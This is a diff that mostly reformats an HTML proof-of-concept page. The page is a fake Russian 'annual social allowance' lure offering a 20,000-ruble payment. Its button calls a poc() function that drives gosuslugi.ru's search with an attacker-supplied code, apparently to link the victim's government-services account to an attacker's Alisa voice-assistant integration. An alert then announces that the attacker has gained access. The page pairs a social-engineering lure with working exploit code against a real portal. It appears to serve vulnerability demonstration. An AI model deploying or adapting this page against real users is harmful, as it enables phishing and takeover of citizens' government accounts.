@@ -3,24 +3,97 @@
 <head>
     <meta charset="utf-8"/>
     <style>
-        html,body,div{margin:0;padding:0;border:0;font-size:100%;font:inherit;vertical-align:baseline}
-        body{line-height:1}
-        html{height:100%;overflow-x:hidden}
-        body{display:flex;flex-direction:column}
-        body{font-family:Lato,Arial,sans-serif,-apple-system;overflow-x:hidden}
-        *,*:after,*:before{box-sizing:border-box}
-        @media print{*{-webkit-print-color-adjust:exact;color-adjust:exact}
-        @page{size:A4;margin:1cm}
-        body{display:block!important}
-        html ::-webkit-scrollbar,body ::-webkit-scrollbar{width:0!important}}
-        @media print{html,body{height:auto;margin:0!important;padding:0!important}}
-        @font-face{font-family:Lato;src:url(https://gu-st.ru/landings-st/lib-assets/fonts/Lato-Regular-v2.woff2) format("woff2"),url(https://gu-st.ru/landings-st/lib-assets/fonts/Lato-Regular-v2.woff) format("woff");font-weight:400;font-style:normal;font-display:swap}
-        @font-face{font-family:Lato;src:url(https://gu-st.ru/landings-st/lib-assets/fonts/Lato-Bold-v2.woff2) format("woff2"),url(https://gu-st.ru/landings-st/lib-assets/fonts/Lato-Bold-v2.woff) format("woff");font-weight:700;font-style:normal;font-display:swap}
-        html{overflow:visible}
-        body{display:flex;min-height:100vh;flex-direction:column;background:#FAFCFF;font-family:Lato,Arial,sans-serif,-apple-system;color:#0b1f33}
+        html, body, div {
+            margin: 0;
+            padding: 0;
+            border: 0;
+            font-size: 100%;
+            font: inherit;
+            vertical-align: baseline
+        }
+
+        body {
+            line-height: 1
+        }
+
+        html {
+            height: 100%;
+            overflow-x: hidden
+        }
+
+        body {
+            display: flex;
+            flex-direction: column
+        }
+
+        body {
+            font-family: Lato, Arial, sans-serif, -apple-system;
+            overflow-x: hidden
+        }
+
+        *, *:after, *:before {
+            box-sizing: border-box
+        }
+
+        @media print {
+            * {
+                -webkit-print-color-adjust: exact;
+                color-adjust: exact
+            }
+
+            @page {
+                size: A4;
+                margin: 1cm
+            }
+
+            body {
+                display: block !important
+            }
+
+            html ::-webkit-scrollbar, body ::-webkit-scrollbar {
+                width: 0 !important
+            }
+        }
+
+        @media print {
+            html, body {
+                height: auto;
+                margin: 0 !important;
+                padding: 0 !important
+            }
+        }
+
+        @font-face {
+            font-family: Lato;
+            src: url(https://gu-st.ru/landings-st/lib-assets/fonts/Lato-Regular-v2.woff2) format("woff2"), url(https://gu-st.ru/landings-st/lib-assets/fonts/Lato-Regular-v2.woff) format("woff");
+            font-weight: 400;
+            font-style: normal;
+            font-display: swap
+        }
+
+        @font-face {
+            font-family: Lato;
+            src: url(https://gu-st.ru/landings-st/lib-assets/fonts/Lato-Bold-v2.woff2) format("woff2"), url(https://gu-st.ru/landings-st/lib-assets/fonts/Lato-Bold-v2.woff) format("woff");
+            font-weight: 700;
+            font-style: normal;
+            font-display: swap
+        }
+
+        html {
+            overflow: visible
+        }
+
+        body {
+            display: flex;
+            min-height: 100vh;
+            flex-direction: column;
+            background: #FAFCFF;
+            font-family: Lato, Arial, sans-serif, -apple-system;
+            color: #0b1f33
+        }
     </style>
     <style>
-        div{
+        div {
             padding: 16px;
             display: flex;
             line-height: 24px;
@@ -28,12 +101,13 @@
             font-family: Lato, Arial, sans-serif, -apple-system;
         }
 
-        .column{
+        .column {
             flex-direction: column;
         }
+
         button {
             display: inline-block;
-            font-family: Lato,Arial,sans-serif;
+            font-family: Lato, Arial, sans-serif;
             width: 100%;
             outline: none;
             border: 2px solid transparent;
@@ -47,12 +121,14 @@
             cursor: pointer;
             white-space: nowrap;
         }
-        input{
+
+        input {
             padding: 8px;
             width: 50%;
             margin: 8px;
         }
-        span{
+
+        span {
             color: gray;
             font-size: 12px;
             margin: 8px;
@@ -62,7 +138,8 @@
     <script>
         let openedWindow;
         let closeTimeout;
-        async function poc (payload) {
+
+        async function poc(payload) {
             clearTimeout(closeTimeout);
             let url = `https://www.gosuslugi.ru/newsearch?query=${encodeURI(payload)}`;
             if (openedWindow) {
@@ -85,51 +162,52 @@
     </script>
 </head>
 <body>
-
-<div>
+<div style="align-items: center; justify-content: center">
     <div>
-        <object type="image/svg+xml" data="./max.svg" width="200" height="200" ></object>
+        <div>
+            <object type="image/svg+xml" data="./max.svg" width="200" height="200"></object>
+        </div>
+        <div class="column">
+            <div>
+                <h2>Ежегодная социальная надбавка</h2>
+            </div>
+            <div>
+                Если семьи менее 75 000 рубей в месяц. Вам положена единоразовая выплата в размере 20 000 рублей за 2024
+                год из Фонда Социального Страхования.
+            </div>
+            <div>
+                <button onclick="connectAlisa()">Оставить заявку через робота Макса</button>
+            </div>
+
+        </div>
+
+        <script>
+            let code;
+            const response = fetch('/get-code').then(async response => {
+                const responseJSON = await response.json();
+                code = responseJSON.code;
+                console.log('code!', code);
+            })
+
+
+            function connectAlisa() {
+                const code = window.document.getElementById('alisaCode').value;
+                poc(code);
+
+
+                alert('Злоумышленник получил доступ к твоим госуслугам через интеграцию робота Макса в колонку Алиса')
+            };
+
+            async function fastDisconnectAlisa() {
+                await poc('Алиса')
+                await poc('Удалить связь')
+                await poc('Да')
+            }
+        </script>
+
+
     </div>
-    <div class="column">
-        <div>
-            <h2>Ежегодная социальная надбавка</h2>
-        </div>
-        <div>
-            Если семьи менее 75 000 рубей в месяц. Вам положена единоразовая выплата в размере 20 000 рублей за 2024 год из Фонда Социального Страхования.
-        </div>
-        <div>
-            <button onclick="connectAlisa()">Оставить заявку через робота Макса</button>
-        </div>
-
-    </div>
-
-    <script>
-        let code;
-        const response = fetch('/get-code').then(async response => {
-            const responseJSON = await response.json();
-            code = responseJSON.code;
-            console.log('code!', code);
-        })
-
-
-        function connectAlisa() {
-            const code = window.document.getElementById('alisaCode').value;
-            poc(code);
-
-
-            alert('Злоумышленник получил доступ к твоим госуслугам через интеграцию робота Макса в колонку Алиса')
-        };
-        async function fastDisconnectAlisa() {
-            await poc('Алиса')
-            await poc('Удалить связь')
-            await poc('Да')
-        }
-    </script>
-
-
 </div>
-
-
 
 
 <!--<button onclick="fastDisconnectAlisa()">Отвязать Макса от Алисы</button>-->
